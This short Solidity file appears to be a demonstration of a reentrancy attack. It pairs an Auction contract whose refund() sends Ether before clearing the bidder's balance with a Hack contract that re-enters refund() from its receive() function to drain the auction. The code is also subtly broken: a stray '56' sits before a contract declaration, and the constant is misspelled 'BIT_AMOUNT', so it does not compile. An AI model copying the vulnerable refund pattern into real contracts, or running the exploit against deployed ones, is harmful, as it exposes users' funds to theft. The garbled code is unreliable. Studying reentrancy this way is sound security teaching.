// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

56contract Auction {
  mapping(address bider => uint) public bids;

  function bid() external payable {
    bids[msg.sender] += msg.value;
  }

  function refund() external {
    uint refundAmount = bids[msg.sender];

    if (refundAmount > 0) {
      (bool ok,) = msg.sender.call{ value: refundAmount }("");
      require(ok, "can't send");

      bids[msg.sender] = 0;
    }
  }
}

contract Hack {
  Auction toHack;
  uint constant BID_AMOUNT = 1 ether;

  constructor(address _toHack) payable {
    require(msg.value == BID_AMOUNT);

    toHack = Auction(_toHack);
    toHack.bid{ value: msg.value }();
  }

  function hack() public {
    toHack.refund();
  }

  receive() external payable {
    if (address(toHack).balance >= BIT_AMOUNT) {
      hack();
    }
  }
}